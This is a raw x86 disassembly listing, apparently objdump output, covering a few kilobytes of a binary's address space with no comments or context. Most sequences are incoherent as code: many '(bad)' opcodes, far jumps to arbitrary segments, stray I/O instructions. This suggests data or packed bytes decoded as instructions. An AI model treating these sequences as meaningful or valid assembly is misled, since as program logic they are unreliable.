  40455b:	add    BYTE PTR [ebp+esi*8+0x25],bh
  40455f:	mov    ebp,edi
  404561:	jmp    0x463e:0x5741e6b8
  404568:	mov    ah,0x79
  40456a:	(bad)  
  40456b:	(bad)  
  40456c:	fidiv  DWORD PTR [esi-0x47]
  40456f:	jmp    0x40456e
  404571:	pusha  
  404572:	mov    dh,0xbd
  404574:	(bad)  
  404575:	das    
  404576:	mov    eax,0x4fa44bb4
  40457b:	mov    al,0xf6
  40457d:	mov    eax,0x4f667332
  404582:	fisub  WORD PTR gs:[edx]
  404585:	mov    dl,0x7b
  404587:	add    ah,BYTE PTR [ebx+0x55]
  40458a:	aam    0x68
  40458c:	and    esp,DWORD PTR [edi-0x7]
  40458f:	mov    esi,0x7819a4f3
  404594:	cmp    ebx,DWORD PTR [edi+0x2ab733c]
  40459a:	xor    DWORD PTR [eax+0x78],esi
  40459d:	sbb    DWORD PTR [ecx],eax
  40459f:	or     al,BYTE PTR [edi-0x2b]
  4045a2:	add    ebx,esi
  4045a4:	sub    DWORD PTR [ebp+0x19],ecx
  4045a7:	es cmp al,0x5c
  4045aa:	jecxz  0x40460e
  4045ac:	or     esp,edi
  4045ae:	xor    DWORD PTR [ebp+0x1ac855],ebp
  4045b4:	add    BYTE PTR [eax-0x14dda76],bh
  4045ba:	pop    edx
  4045bb:	fcmovu st,st(5)
  4045bd:	cmp    al,0xd7
  4045bf:	xchg   ecx,eax
  4045c0:	mov    edx,0x72d9292a
  4045c5:	mov    al,0x60
  4045c7:	jns    0x404583
  4045c9:	pop    esi
  4045ca:	mov    al,ds:0xe0226705
  4045cf:	push   eax
  4045d0:	fsubr  QWORD PTR [edi+0x2b617abc]
  4045d6:	mov    al,0x69
  4045d8:	test   BYTE PTR [ecx+0x3a0f0000],ch
  4045de:	xor    bh,BYTE PTR [ebp-0xc]
  4045e1:	aas    
  4045e2:	jl     0x40464d
  4045e4:	hlt    
  4045e5:	push   es
  4045e6:	lds    ecx,FWORD PTR [eax+0x1c0000e7]
  4045ec:	(bad)  
  4045ed:	lock push ecx
  4045ef:	push   edx
  4045f0:	jbe    0x40461d
  4045f2:	shl    BYTE PTR [edx],cl
  4045f4:	mov    ds:0x10eb9410,eax
  4045f9:	cld    
  4045fa:	xchg   BYTE PTR [edx+0x1e],ch
  4045fd:	js     0x40467a
  4045ff:	js     0x404604
  404601:	and    bl,BYTE PTR [eax-0x26]
  404604:	loopne 0x404598
  404606:	sbb    cl,dh
  404608:	jne    0x4045ba
  40460a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40460b:	lds    ecx,FWORD PTR [edx-0x48]
  40460e:	popf   
  40460f:	cld    
  404610:	ds mov ebx,0xaf23cd2
  404616:	iret   
  404617:	mov    BYTE PTR [ebp+0x0],dl
  40461a:	add    BYTE PTR [ebx-0x4e],ah
  40461d:	pop    ss
  40461e:	adc    dh,bh
  404620:	cli    
  404621:	mov    ?,WORD PTR [esi+0x26]
  404624:	inc    esi
  404625:	and    eax,0xdf326262
  40462a:	arpl   WORD PTR [esi+0x6fe3e7f7],ax
  404630:	(bad)  
  404631:	sub    bh,BYTE PTR [ebx]
  404633:	jne    0x4046ad
  404635:	xor    esp,eax
  404637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404638:	add    BYTE PTR [eax],al
  40463a:	add    DWORD PTR [eax],0x6b000083
  404640:	leave  
  404641:	retf   0x8e24
  404644:	enter  0x86,0x0
  404648:	inc    edx
  404649:	jno    0x4045d8
  40464b:	push   ss
  40464c:	mov    ebx,0x43c44574
  404651:	add    BYTE PTR [eax],al
  404653:	test   al,0x26
  404655:	xlat   BYTE PTR ds:[ebx]
  404656:	sub    eax,0xb926d503
  40465b:	popa   
  40465c:	xor    dh,BYTE PTR [edi+edi*4+0x278cf651]
  404663:	add    BYTE PTR [eax],al
  404665:	dec    esi
  404666:	je     0x40465e
  404668:	cs out 0xd6,al
  40466b:	jno    0x404670
  40466d:	push   0xe3962d9e
  404672:	xor    eax,0x95cde020
  404677:	push   ds
  404678:	and    dl,bl
  40467a:	mov    esi,0x6a13507f
  40467f:	pop    ebx
  404680:	int3   
  404681:	inc    esp
  404682:	add    BYTE PTR [eax],al
  404684:	aad    0x60
  404686:	pop    ds
  404687:	add    esi,DWORD PTR [ebp+0x59829be5]
  40468d:	ds jb  0x4046f7
  404690:	sbb    dh,BYTE PTR [ecx]
  404692:	xor    ebx,DWORD PTR [ebp-0x79]
  404695:	mov    ds:0x4259f9dc,al
  40469a:	pop    es
  40469b:	out    0x21,eax
  40469d:	inc    BYTE PTR [edi]
  40469f:	xchg   esp,eax
  4046a0:	popa   
  4046a1:	call   0x6c33:0xaa15d073
  4046a8:	mov    BYTE PTR [ebx-0x64010000],al
  4046ae:	sub    dl,BYTE PTR [ecx]
  4046b0:	(bad)  
  4046b1:	jae    0x4046dc
  4046b3:	sbb    bl,BYTE PTR [ebx+ebx*1+0x7356c752]
  4046ba:	test   cl,cl
  4046bc:	add    BYTE PTR [eax],al
  4046be:	sbb    DWORD PTR ds:0xf9fd957b,edi
  4046c4:	mov    cl,0x6d
  4046c6:	test   eax,0xbd66728a
  4046cb:	jae    0x404682
  4046cd:	out    dx,al
  4046ce:	and    DWORD PTR [esi+edi*1-0xe],ebx
  4046d2:	mov    ecx,0xc5eb78d4
  4046d7:	mov    BYTE PTR [ecx-0x6fd10000],bh
  4046dd:	clc    
  4046de:	js     0x404683
  4046e0:	mov    al,0xb9
  4046e2:	bnd jle 0x4046cc
  4046e5:	jp     0x4046f7
  4046e7:	xchg   esi,eax
  4046e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046e9:	adc    edi,ecx
  4046eb:	test   DWORD PTR [edi-0x39],esp
  4046ee:	adc    eax,0x1fe2017a
  4046f3:	mov    cl,0x46
  4046f5:	popa   
  4046f6:	test   al,0xb7
  4046f8:	outs   dx,DWORD PTR ds:[esi]
  4046f9:	xlat   BYTE PTR ds:[ebx]
  4046fa:	aaa    
  4046fb:	sahf   
  4046fc:	test   al,0x70
  4046fe:	xchg   esi,eax
  4046ff:	mov    ch,0xf7
  404701:	adc    al,0xd2
  404703:	loope  0x4046df
  404705:	pop    edx
  404706:	dec    ebp
  404707:	mov    dh,0x7f
  404709:	and    eax,DWORD PTR [ebx]
  40470b:	pop    es
  40470c:	jno    0x40477e
  40470e:	je     0x404729
  404710:	jbe    0x4046ca
  404712:	cmp    dh,BYTE PTR ds:0x79011f37
  404718:	mov    al,ds:0x654d7fe3
  40471d:	das    
  40471e:	cli    
  40471f:	push   0xffffff8f
  404721:	dec    esi
  404722:	sahf   
  404723:	jp     0x40479a
  404725:	jl     0x404747
  404727:	cmp    al,0xbb
  404729:	mov    ch,0x84
  40472b:	add    BYTE PTR ss:[eax],al
  40472e:	jge    0x404765
  404730:	les    esp,FWORD PTR [ecx+0x0]
  404733:	add    BYTE PTR [ecx+0x5c3e2231],al
  404739:	nop
  40473a:	mov    edi,0xb0b4befd
  40473f:	and    cl,BYTE PTR [ebp+0x2e]
  404742:	into   
  404743:	cmp    al,0xfb
  404745:	mov    al,BYTE PTR [eax-0x4b]
  404748:	add    BYTE PTR [eax],al
  40474a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40474b:	mov    esp,0x436c1074
  404750:	cs mov edx,0x6d526bcb
  404756:	das    
  404757:	jns    0x404758
  404759:	xchg   ebx,eax
  40475a:	sti    
  40475b:	fimul  DWORD PTR [edx+0x63cc]
  404761:	shl    DWORD PTR ds:0x44a017b5,cl
  404767:	aad    0x0
  404769:	add    BYTE PTR [esi-0x4d944a4f],cl
  40476f:	dec    ebp
  404770:	retf   
  404771:	nop
  404772:	mov    WORD PTR [eax+eax*1+0x6203700],cs
  404779:	jns    0x404776
  40477b:	adc    ah,dh
  40477d:	add    eax,0x97f1ee41
  404782:	or     esp,DWORD PTR [eax]
  404784:	dec    ebp
  404785:	fnstenv [eax+0x6a]
  404788:	sub    esi,esi
  40478a:	xchg   BYTE PTR [ecx+0x3dc08e02],bh
  404790:	add    BYTE PTR [eax],al
  404792:	ss mov ch,0x2b
  404795:	push   ss
  404796:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404797:	cmp    dh,BYTE PTR [esi+0x72023e30]
  40479d:	mov    es,WORD PTR [edx]
  40479f:	lock cmp BYTE PTR [ebp-0x60],bl
  4047a3:	pop    esi
  4047a4:	fiadd  WORD PTR [edi+ebx*2+0x0]
  4047a8:	add    BYTE PTR [eax],ah
  4047aa:	(bad)
  4047ae:	add    BYTE PTR [ebx-0x48],al
  4047b1:	retf   0xd690
  4047b4:	push   ds
  4047b5:	stos   BYTE PTR es:[edi],al
  4047b6:	repnz adc DWORD PTR [eax-0x7effff3a],ecx
  4047bd:	sub    ebp,DWORD PTR [eax+ebp*2+0x3a]
  4047c1:	sub    DWORD PTR [ecx+0x591d9e3a],esp
  4047c7:	aam    0x4d
  4047c9:	rdtsc  
  4047cb:	int    0x28
  4047cd:	lea    esi,[eax+edi*4-0x19]
  4047d1:	imul   DWORD PTR [esp+eiz*4-0xce78e26]
  4047d8:	cmp    eax,0xffffff92
  4047db:	push   cs
  4047dc:	xor    BYTE PTR [ebp+0x6f],al
  4047df:	ss cmp eax,0x70e75dd8
  4047e5:	cli    
  4047e6:	xlat   BYTE PTR ds:[ebx]
  4047e7:	fimul  DWORD PTR [esi+edx*4-0x62460000]
  4047ee:	loopne 0x4047b7
  4047f0:	mov    dh,0x18
  4047f2:	arpl   ax,sp
  4047f4:	and    DWORD PTR [esi-0x5d],0xfffffffe
  4047f8:	test   DWORD PTR [edi],esp
  4047fa:	lock push cs
  4047fc:	jae    0x40477e
  4047fe:	mov    al,0x0
  404800:	add    BYTE PTR [esi-0x66],dl
  404803:	aaa    
  404804:	sbb    dh,BYTE PTR [edx+ecx*2]
  404807:	aas    
  404808:	and    ebx,ebx
  40480a:	sbb    dh,dh
  40480c:	popa   
  40480d:	mov    ds:0x1700e067,al
  404812:	add    BYTE PTR [eax],al
  404814:	push   esi
  404815:	jle    0x404846
  404817:	pusha  
  404818:	ret    
  404819:	jmp    0xcf:0x847dac56
  404820:	add    ah,bl
  404822:	mov    edi,0xd8802e
  404827:	add    BYTE PTR [ebp+0x22],bh
  40482a:	and    BYTE PTR [esi+0x68adb1e4],cl
  404830:	and    bl,0x0
  404833:	add    ch,bh
  404835:	jecxz  0x40482a
  404837:	stos   BYTE PTR es:[edi],al
  404838:	int    0x39
  40483a:	fwait
  40483b:	scas   al,BYTE PTR es:[edi]
  40483c:	mov    ecx,0xa6892832
  404841:	mov    esi,0xbdc4453e
  404846:	add    BYTE PTR [eax],al
  404848:	imul   edi,DWORD PTR [edx+0x6f],0xcbd02129
  40484f:	fs mov eax,0x57402f8b
  404855:	add    BYTE PTR [eax],al
  404857:	test   edx,esi
  404859:	sahf   
  40485a:	test   al,0xd1
  40485c:	xor    al,BYTE PTR [esi]
  40485e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40485f:	jns    0x404888
  404861:	or     al,0x11
  404863:	add    BYTE PTR [eax],al
  404865:	xchg   esi,eax
  404866:	pop    ecx
  404867:	stos   BYTE PTR es:[edi],al
  404868:	add    eax,0x84023fc9
  40486d:	and    eax,DWORD PTR [eax]
  40486f:	add    BYTE PTR [eax+0x4a44db],dh
  404875:	add    BYTE PTR [edx+0x6b],ah
  404878:	push   0x7df59756
  40487d:	fimul  WORD PTR gs:[ebp-0x47bcd342]
  404884:	lea    edi,[esi+0x782034f0]
  40488a:	and    dl,BYTE PTR [ebp+0x4ab66739]
  404890:	cmc    
  404891:	data16 loopne 0x4048f4
  404894:	jb     0x40482a
  404896:	and    BYTE PTR [ecx+0x2172ff76],al
  40489c:	out    0xd7,eax
  40489e:	pop    ss
  40489f:	cmp    ch,BYTE PTR [edx+eax*1+0x44]
  4048a3:	sub    BYTE PTR [eax],al
  4048a5:	add    BYTE PTR [esi],cl
  4048a7:	cmp    al,0x3d
  4048a9:	jge    0x404905
  4048ab:	sar    dh,cl
  4048ad:	cmp    BYTE PTR [edi],cl
  4048af:	mov    ds:0xa6c0462f,eax
  4048b4:	add    BYTE PTR [eax],al
  4048b6:	sub    BYTE PTR [eax+0x820c],bh
  4048bc:	ror    BYTE PTR [edx],1
  4048be:	mov    edi,0xbfa93fc1
  4048c3:	cld    
  4048c4:	cmp    eax,0x68fe30af
  4048c9:	sub    ah,BYTE PTR ds:0xedc4
  4048cf:	retf   0x400d
  4048d2:	mov    es,WORD PTR [eax]
  4048d4:	add    BYTE PTR [esi-0x4f],cl
  4048d7:	jp     0x4048a4
  4048d9:	mov    ah,0xd1
  4048db:	fimul  WORD PTR [edx+0x4311ae86]
  4048e1:	(bad)  
  4048e2:	addr16 jmp 0x404923
  4048e5:	jge    0x404868
  4048e7:	mov    esi,0xfd658542
  4048ec:	lods   eax,DWORD PTR ds:[esi]
  4048ed:	ja     0x4048bf
  4048ef:	es or  dl,dh
  4048f2:	add    BYTE PTR [eax],al
  4048f4:	fadd   DWORD PTR [esi+eax*4-0x485c0000]
  4048fb:	test   al,0xa2
  4048fd:	and    al,0x62
  4048ff:	xor    bl,bl
  404901:	cmp    al,0xba
  404903:	addr16 ret 0xb050
  404907:	sbb    ebx,edi
  404909:	and    BYTE PTR [ecx+esi*8-0x50b77e05],bl
  404910:	add    BYTE PTR [eax],al
  404912:	xor    BYTE PTR [ebp+eax*8-0x73314a5a],ah
  404919:	or     al,BYTE PTR [eax]
  40491b:	add    BYTE PTR [edi+0x329dc11],dh
  404921:	mov    cl,0x7f
  404923:	in     al,0xc3
  404925:	popf   
  404926:	jns    0x404951
  404928:	(bad)  
  404929:	stc    
  40492a:	int3   
  40492b:	sbb    DWORD PTR [eax],eax
  40492d:	add    BYTE PTR [ebx],bh
  40492f:	xchg   esp,eax
  404930:	cmp    al,0x47
  404932:	push   0x4b
  404934:	ja     0x4049a5
  404936:	fstp   TBYTE PTR [ebx]
  404938:	sbb    eax,0x180f36bb
  40493d:	dec    esi
  40493e:	ins    BYTE PTR es:[edi],dx
  40493f:	add    cl,BYTE PTR [ecx-0x43]
  404942:	xchg   esp,eax
  404943:	mov    esi,0x4aef2973
  404948:	test   al,0x2f
  40494a:	bound  eax,QWORD PTR es:[edi]
  40494d:	xor    al,0x43
  40494f:	sbb    ecx,DWORD PTR [eax-0xe]
  404952:	add    BYTE PTR [eax],al
  404954:	aad    0xb5
  404956:	int    0xf5
  404958:	ror    BYTE PTR [esp+ebp*8-0x3cbe0000],1
  40495f:	arpl   WORD PTR [ecx-0x2c],sp
  404962:	lock arpl WORD PTR [edx],di
  404965:	ja     0x40491f
  404967:	cmp    al,0x52
  404969:	retf   
  40496a:	mov    ch,0x65
  40496c:	ror    BYTE PTR [edx+0x5d1d9fa],cl
  404972:	mov    bh,0x7e
  404974:	mov    ebp,0x3da706e5
  404979:	mov    eax,ds:0x1ec7b5d9
  40497e:	sti    
  40497f:	fld    QWORD PTR [ecx+0x23]
  404982:	out    dx,al
  404983:	ja     0x4049d0
  404985:	dec    edi
  404986:	and    eax,0xd8feb887
  40498b:	je     0x4049c6
  40498d:	nop
  40498e:	lahf   
  40498f:	push   es
  404990:	fnstcw WORD PTR [ebx]
  404992:	(bad)  
  404993:	mov    edx,0x3788
  404998:	push   esi
  404999:	pop    esi
  40499a:	outs   dx,BYTE PTR ds:[esi]
  40499b:	jg     0x4049ce
  40499d:	lahf   
  40499e:	pop    eax
  40499f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049a0:	add    esp,DWORD PTR ds:0xf821e486
  4049a6:	adc    BYTE PTR ds:0x20dd21dc,ch
  4049ac:	cmc    
  4049ad:	jnp    0x4049e1
  4049af:	loope  0x4049bd
  4049b1:	sub    al,0x0
  4049b3:	add    BYTE PTR [ebx-0x5],bl
  4049b6:	mov    ebp,0xd684
  4049bb:	xor    eax,0x596babee
  4049c0:	daa    
  4049c1:	in     al,0xa2
  4049c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049c4:	xchg   edi,eax
  4049c5:	jmp    0xdda1da14
  4049ca:	mov    ch,BYTE PTR [ecx+0x6ca0542d]
  4049d0:	jno    0x404a2a
  4049d2:	sahf   
  4049d3:	add    al,0xf
  4049d5:	add    BYTE PTR [eax],al
  4049d7:	retf   0x6db5
  4049da:	xor    al,0xde
  4049dc:	ss pop ebx
  4049de:	push   ebx
  4049df:	xchg   DWORD PTR [edi-0x3f],ecx
  4049e2:	push   eax
  4049e3:	repz jge 0x404969
  4049e6:	mov    si,WORD PTR [esi]
  4049e9:	or     DWORD PTR [esi],ebp
  4049eb:	lea    esp,[esi]
  4049ed:	loop   0x404a47
  4049ef:	jmp    0x401a:0xb523e3cb
  4049f6:	sti    
  4049f7:	add    BYTE PTR [eax],al
  4049f9:	pop    es
  4049fa:	mov    ch,BYTE PTR [eax]
  4049fc:	adc    al,0x9
  4049fe:	inc    ecx
  4049ff:	rcr    ebp,cl
  404a01:	cmp    dl,BYTE PTR [edx]
  404a03:	cmp    eax,0x824c
  404a08:	push   ebx
  404a09:	imul   ebp,ecx,0xfffffffe
  404a0c:	mov    edi,0xd2ab3e4b
  404a11:	cmp    al,0x51
  404a13:	std    
  404a14:	sbb    cl,0x0
  404a17:	add    BYTE PTR [esi-0x4b],ah
  404a1a:	cwde   
  404a1b:	ret    0x2f6a
  404a1e:	je     0x404a19
  404a20:	push   ebx
  404a21:	aad    0x77
  404a23:	mov    edx,0xe5653e16
  404a28:	out    dx,al
  404a29:	ficomp WORD PTR [edi-0x6f]
  404a2c:	push   esp
  404a2d:	lods   al,BYTE PTR ds:[esi]
  404a2e:	dec    ebx
  404a2f:	mov    esp,DWORD PTR [ecx]
  404a31:	cmp    ecx,ebx
  404a33:	test   DWORD PTR [ebp-0x7],0xbcf3b912
  404a3a:	push   ebx
  404a3b:	daa    
  404a3c:	(bad)  
  404a3e:	cli    
  404a3f:	ins    DWORD PTR es:[edi],dx
  404a40:	ins    DWORD PTR es:[edi],dx
  404a41:	add    eax,0xa79891f9
  404a46:	fisub  WORD PTR [ebx]
  404a48:	and    bh,bh
  404a4a:	xchg   ebp,eax
  404a4b:	or     eax,0xc7028a57
  404a50:	fist   DWORD PTR [eax+0x918c]
  404a56:	sub    esi,ecx
  404a58:	loop   0x404a15
  404a5a:	imul   DWORD PTR [esi]
  404a5c:	(bad)  
  404a5d:	cli    
  404a5e:	ins    DWORD PTR es:[edi],dx
  404a5f:	pusha  
  404a60:	cmp    eax,0x8b695289
  404a65:	push   edx
  404a66:	inc    ebx
  404a67:	mov    eax,ds:0x50b0da75
  404a6c:	inc    ebp
  404a6d:	lods   al,BYTE PTR ds:[esi]
  404a6e:	fdivr  DWORD PTR gs:[eax]
  404a71:	pop    eax
  404a72:	xor    dl,0x0
  404a75:	add    ah,ch
  404a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a78:	(bad)  
  404a79:	cld    
  404a7a:	mov    al,BYTE PTR [ecx+0x61947760]
  404a80:	adc    eax,ebp
  404a82:	das    
  404a83:	and    al,0xe4
  404a85:	mov    edi,0xbbcb0768
  404a8a:	fidivr DWORD PTR [esi+eax*8-0x3516a9cf]
  404a91:	jecxz  0x404a96
  404a93:	cs and dl,ah
  404a96:	mov    esp,0x5444c7
  404a9b:	add    BYTE PTR [eax],al
  404a9d:	lds    eax,FWORD PTR [eax]
  404a9f:	add    BYTE PTR [ebx+0x6c754bb2],bl
  404aa5:	jge    0x404a98
  404aa7:	test   DWORD PTR [esi],edi
  404aa9:	mov    al,ds:0xa56be3ac
  404aae:	scas   al,BYTE PTR es:[edi]
  404aaf:	jo     0x404aab
  404ab1:	ds sahf 
  404ab3:	es cmp esp,edi
  404ab6:	sbb    ch,dl
  404ab8:	dec    esp
  404ab9:	xor    eax,DWORD PTR [eax]
  404abb:	add    bh,ah
  404abd:	push   eax
  404abe:	repz xchg edi,eax
  404ac0:	jl     0x404ad8
  404ac2:	retf   0x3ef9
  404ac5:	mov    bl,0x60
  404ac7:	push   es
  404ac8:	cmp    eax,0xff2c26d0
  404acd:	mov    ds:0xc53c5438,eax
  404ad2:	jl     0x404a7e
  404ad4:	jmp    0xb9e0:0x17ec855a
  404adb:	sub    al,0x56
  404add:	mov    dl,BYTE PTR [edx-0x4d]
  404ae0:	aas    
  404ae1:	xchg   edi,eax
  404ae2:	rcl    BYTE PTR [edi],0x0
  404ae5:	add    bl,dh
  404ae7:	sub    DWORD PTR ds:[esi+0x5f07f91b],ecx
  404aee:	xchg   ebp,eax
  404aef:	sbb    BYTE PTR [ebx+0x662e0000],0x34
  404af6:	sar    BYTE PTR [esi+0x56],cl
  404af9:	pop    ebx
  404afa:	pop    esp
  404afb:	and    eax,0xf0caaedd
  404b00:	fcmovnbe st,st(0)
  404b02:	pop    esp
  404b03:	jmp    0x404af2
  404b05:	retf   
  404b06:	lods   al,BYTE PTR ds:[esi]
  404b07:	fucomip st,st(0)
  404b09:	into   
  404b0a:	cmp    DWORD PTR [edx+0x63],edi
  404b0d:	cmp    DWORD PTR [ebx],0x53c0da
  404b13:	add    BYTE PTR [esp+ebx*4+0x66],dh
  404b17:	icebp  
  404b18:	cmp    esi,DWORD PTR [edx]
  404b1a:	or     BYTE PTR [edx+0x0],bh
  404b1d:	add    BYTE PTR [ebx],dh
  404b1f:	xor    dl,BYTE PTR [ebp-0x38]
  404b22:	mov    ah,0x0
  404b24:	add    dh,cl
  404b26:	pop    edi
  404b27:	sar    DWORD PTR [edx],1
  404b29:	adc    esp,0x26881c22
  404b2f:	add    BYTE PTR [eax],al
  404b31:	xor    DWORD PTR [ebx+eiz*8],esi
  404b34:	icebp  
  404b35:	inc    esp
  404b36:	cmp    BYTE PTR [eax],al
  404b38:	add    BYTE PTR [edx],ah
  404b3a:	jle    0x404af9
  404b3c:	dec    edi
  404b3d:	(bad)  
  404b3e:	daa    
  404b3f:	mov    BYTE PTR [ebx+0x0],ch
  404b42:	add    BYTE PTR [ebx+0x67],ch
  404b45:	shl    DWORD PTR [edi+0xc603ea2],0x8b
  404b4c:	add    BYTE PTR [eax],al
  404b4e:	xchg   ecx,eax
  404b4f:	add    ebx,DWORD PTR [ebp-0x73c493d5]
  404b55:	inc    BYTE PTR [eax]
  404b57:	add    BYTE PTR [eax],bh
  404b59:	mov    eax,ds:0xde2d4bb6
  404b5e:	ds nop
  404b60:	fcom   DWORD PTR [ecx+0x18]
  404b63:	jae    0x404b22
  404b65:	mov    edi,DWORD PTR [esi]
  404b67:	test   BYTE PTR [edi+0x0],ch
  404b6a:	add    BYTE PTR [ebx+0x885fc1f],al
  404b70:	mov    BYTE PTR [eax],al
  404b72:	add    bh,ch
  404b74:	ret    0xc8ee
  404b77:	inc    ebp
  404b78:	add    BYTE PTR [eax],al
  404b7a:	adc    al,0xb6
  404b7c:	dec    esi
  404b7d:	and    eax,0xfe0c
  404b82:	pop    ecx
  404b83:	lods   al,BYTE PTR ds:[esi]
  404b84:	pop    ds
  404b85:	ss (bad) 
  404b88:	nop
  404b89:	cld    
  404b8a:	stos   BYTE PTR es:[edi],al
  404b8b:	dec    ebx
  404b8c:	mov    edi,es
  404b8e:	add    BYTE PTR [eax],al
  404b90:	xchg   ecx,eax
  404b91:	out    0x1e,al
  404b93:	bound  edi,QWORD PTR [eax+0x7e]
  404b96:	inc    edi
  404b97:	repz mov al,0xda
  404b9a:	jecxz  0x404b2e
  404b9c:	bound  edi,QWORD PTR ds:0x850fdfec
  404ba2:	into   
  404ba3:	sbb    ebx,DWORD PTR ds:0x3daa5235
  404ba9:	(bad)  
  404baa:	jo     0x81404bba
  404bb0:	call   0x1a80:0x71de425e
  404bb7:	add    BYTE PTR [eax],al
  404bb9:	ins    DWORD PTR es:[edi],dx
  404bba:	add    eax,0x356e830d
  404bbf:	call   0x41db:0x345eaaef
  404bc6:	push   eax
  404bc7:	jne    0x404c33
  404bc9:	mov    esi,0xc26fe593
  404bce:	pop    edi
  404bcf:	add    ch,BYTE PTR [edi+0xad0c53]
  404bd5:	add    BYTE PTR [eax],bl
  404bd7:	sub    eax,0xa17cb18b
  404bdc:	pop    esp
  404bdd:	and    dh,BYTE PTR [edi+0x0]
  404be0:	mov    al,0x0
  404be2:	add    BYTE PTR [eax],dl
  404be4:	push   0x10
  404be6:	dec    esp
  404be7:	pop    edi
  404be8:	add    BYTE PTR [eax],al
  404bea:	(bad)  
  404beb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bec:	xchg   ebx,eax
  404bed:	ds enter 0xc1,0x0
  404bf2:	push   esp
  404bf3:	mov    esp,0x11e17e16
  404bf8:	sbb    BYTE PTR [esi+0x0],0x0
  404bfc:	leave  
  404bfd:	or     al,0x42
  404bff:	add    BYTE PTR [eax],al
  404c01:	pushf  
  404c02:	adc    eax,0x27f560d6
  404c07:	jle    0x404c00
  404c09:	xor    al,0xf7
  404c0b:	leave  
  404c0c:	sub    ch,BYTE PTR [ebp+esi*4+0x5dcfb136]
  404c13:	rol    BYTE PTR [edi+0xe6c8],cl
  404c19:	scas   eax,DWORD PTR es:[edi]
  404c1a:	call   0x72e31f99
  404c1f:	rcr    BYTE PTR [edx+0x41d60000],0xd6
  404c26:	mov    bl,0xd4
  404c28:	mov    bl,BYTE PTR [eax-0x18]
  404c2b:	stos   DWORD PTR es:[edi],eax
  404c2c:	xor    DWORD PTR [edi+0x20],ebp
  404c2f:	add    DWORD PTR [esi-0x55040e7],ecx
  404c35:	in     al,0xde
  404c37:	pusha  
  404c38:	mov    cs,WORD PTR [esi]
  404c3a:	into   
  404c3b:	call   0x6c7e:0x32fa6b6d
  404c42:	mov    ebp,0xeab3fb2c
  404c47:	sub    esi,edi
  404c49:	pop    esp
  404c4a:	ins    DWORD PTR es:[edi],dx
  404c4b:	jg     0x404beb
  404c4d:	imul   ebp,DWORD PTR [ebx-0x4a],0xfffffff4
  404c51:	(bad)  
  404c52:	cmp    eax,0xfef0582f
  404c57:	out    0x40,eax
  404c59:	mov    al,BYTE PTR [eax]
  404c5b:	add    BYTE PTR [esi+0x3c],dl
  404c5e:	(bad)  
  404c5f:	stos   DWORD PTR es:[edi],eax
  404c60:	xor    al,BYTE PTR [esi+0x76f231e3]
  404c66:	and    ebp,DWORD PTR [eax+ecx*2-0x72]
  404c6a:	add    BYTE PTR [eax],al
  404c6c:	sub    eax,0x2fcb8b2e
  404c71:	mov    eax,0xe944
  404c76:	lock mov ds,WORD PTR [edx-0x5e]
  404c7a:	sub    eax,0x997635a2
  404c7f:	icebp  
  404c80:	dec    esi
  404c81:	(bad)  
  404c82:	test   eax,0xf5b87036
  404c87:	sar    DWORD PTR [edx+0x66dcf526],1
  404c8d:	push   edx
  404c8e:	in     eax,dx
  404c8f:	repnz (bad) 
  404c91:	aas    
  404c92:	mov    ds:0x7ea89130,al
  404c97:	mov    al,ds:0xd026fece
  404c9c:	and    ecx,DWORD PTR [ecx]
  404c9e:	into   
  404c9f:	sbb    al,0x9f
  404ca1:	or     edx,DWORD PTR [eax+0x5b]
  404ca4:	mov    ecx,0xa48eb94d
  404ca9:	lods   eax,DWORD PTR ds:[esi]
  404caa:	test   BYTE PTR [ecx],bl
  404cac:	add    BYTE PTR [eax],al
  404cae:	dec    edx
  404caf:	bound  ebp,QWORD PTR [esi+0xd14eb87]
  404cb5:	pushf  
  404cb6:	and    BYTE PTR [ebp+0x71a55c90],dl
  404cbc:	jmp    0x404c55
  404cbe:	sub    edi,esp
  404cc0:	push   cs
  404cc1:	ds or  al,0x6c
  404cc4:	add    BYTE PTR [eax],al
  404cc6:	push   ds
  404cc7:	mov    esi,0xf677cd27
  404ccc:	aas    
  404ccd:	push   esp
  404cce:	fstp   DWORD PTR [ecx+0x30]
  404cd1:	sub    DWORD PTR [ebp-0x72],edi
  404cd4:	shl    edi,1
  404cd6:	push   ebp
  404cd7:	adc    eax,0x38aa7d8
  404cdc:	push   ecx
  404cdd:	imul   edi,DWORD PTR ds:0xc34591ce,0xb63f83d8
  404ce7:	push   esp
  404ce8:	lea    ebp,[esi+esi*1+0x22]
  404cec:	dec    esp
  404ced:	sub    BYTE PTR [eax],al
  404cef:	add    BYTE PTR [esi+eax*2],bl
  404cf2:	jp     0x404cfd
  404cf4:	loop   0x404d00
  404cf6:	das    
  404cf7:	mov    eax,0x8c5d3bec
  404cfc:	fiadd  DWORD PTR [eax]
  404cfe:	add    BYTE PTR [ebx],ah
  404d00:	arpl   sp,cx
  404d02:	jne    0x404d04
  404d04:	add    BYTE PTR [edx],ch
  404d06:	jae    0x404d46
  404d08:	xor    ebp,DWORD PTR [ecx-0x4c]
  404d0b:	mov    al,ds:0x6e4e5662
  404d10:	jmp    0x404d3b
  404d12:	jecxz  0x404cd3
  404d14:	mov    ch,0xae
  404d16:	stc    
  404d17:	mov    eax,ds:0x1ef1de5
  404d1c:	test   DWORD PTR [ebp-0x4c],esi
  404d1f:	stos   BYTE PTR es:[edi],al
  404d20:	sahf   
  404d21:	jae    0x404d94
  404d23:	xor    eax,0x351f47b0
  404d28:	cld    
  404d29:	sub    BYTE PTR [edx],al
  404d2b:	rcl    BYTE PTR [ecx],1
  404d2d:	loop   0x404d96
  404d2f:	adc    BYTE PTR [edx+0x33],bh
  404d32:	add    dh,bl
  404d34:	add    BYTE PTR [eax],al
  404d36:	(bad)  
  404d37:	out    dx,eax
  404d38:	inc    esp
  404d39:	hlt    
  404d3a:	add    BYTE PTR [eax],al
  404d3c:	jbe    0x404d2e
  404d3e:	shl    edx,cl
  404d40:	push   ebx
  404d41:	cmp    eax,0x8c3e110a
  404d46:	rol    BYTE PTR [eax],cl
  404d48:	add    BYTE PTR [eax+0x41000091],al
